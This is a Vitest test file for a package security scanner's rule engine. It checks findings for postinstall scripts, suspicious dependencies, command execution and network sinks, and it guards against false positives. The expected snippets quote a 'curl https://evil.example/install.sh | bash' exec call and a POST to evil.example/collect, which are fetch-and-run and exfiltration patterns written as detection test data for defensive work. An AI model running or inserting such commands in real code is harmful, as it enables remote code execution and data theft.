import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";
import { runRules } from "../src/rules.js";

describe("runRules", () => {
  it("creates evidence-grounded findings for scripts, command execution, network candidates, and risky dependencies", async () => {
    const root = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "postinstall-script",
        riskLevel: "High",
        filePath: "package.json",
        lineStart: 1,
        codeSnippet: '"postinstall": "node src/index.ts"',
        confidence: "High",
        evidenceTags: ["package-script", "postinstall"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "supply-chain",
        riskLevel: "High",
        filePath: "package.json",
        lineStart: 1,
        codeSnippet: "github:some-user/suspicious-repo",
        confidence: "High",
        evidenceTags: ["dependency-source"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "command-injection",
        riskLevel: "Critical",
        filePath: "src/index.ts",
        lineStart: 13,
        lineEnd: 13,
        codeSnippet: "exec(`curl https://evil.example/install.sh | bash`);",
        confidence: "High",
        evidenceTags: ["command-execution"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network",
        riskLevel: "High",
        filePath: "src/index.ts",
        lineStart: 9,
        lineEnd: 9,
        codeSnippet: 'https.request("https://evil.example/collect", { method: "POST" }).end(',
        confidence: "High",
        evidenceTags: ["network-endpoint", "exfiltration-candidate", "sensitive-source-present"],
        sink: "https://evil.example/collect"
      })
    );
    expect(findings.some((finding) => finding.category === "data-exfiltration")).toBe(false);
  });

  it("does not classify child_process imports as command injection", async () => {
    const root = await createProject({
      "src/index.ts": [
        'import { exec } from "node:child_process";',
        "",
        'exec("echo hello");',
        ""
      ].join("\n")
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const commandFindings = findings.filter((finding) => finding.category === "command-injection");

    expect(commandFindings).toEqual([
      expect.objectContaining({
        category: "command-injection",
        riskLevel: "High",
        filePath: "src/index.ts",
        lineStart: 3,
        lineEnd: 3,
        codeSnippet: 'exec("echo hello");',
        confidence: "High",
        evidenceTags: ["command-execution"]
      })
    ]);
    expect(commandFindings.some((finding) => finding.codeSnippet.includes("child_process"))).toBe(false);
  });

  it("does not classify RegExp exec calls as command injection", async () => {
    const root = await createProject({
      "src/parser.ts": "const match = /token=(.*)/.exec(line);\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings.filter((finding) => finding.category === "command-injection")).toEqual([]);
  });

  it("downgrades test and example endpoints instead of blocking them as exfiltration", async () => {
    const root = await createProject({
      "tests/links.test.ts": "expect(render('https://example.com/docs')).toContain('docs');\n",
      "src/client.ts": "fetch('https://api.vendor.test/v1');\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network",
        riskLevel: "Low",
        filePath: "tests/links.test.ts",
        evidenceTags: ["network-endpoint", "test-or-example-endpoint"],
        sink: "https://example.com/docs"
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network",
        riskLevel: "Medium",
        filePath: "src/client.ts",
        evidenceTags: ["network-endpoint"],
        sink: "https://api.vendor.test/v1"
      })
    );
  });
});

async function createProject(files: Record<string, string>): Promise<string> {
  const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "rules-test-"));

  await Promise.all(
    Object.entries(files).map(async ([filePath, content]) => {
      const fullPath = path.join(rootDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    })
  );

  return rootDir;
}
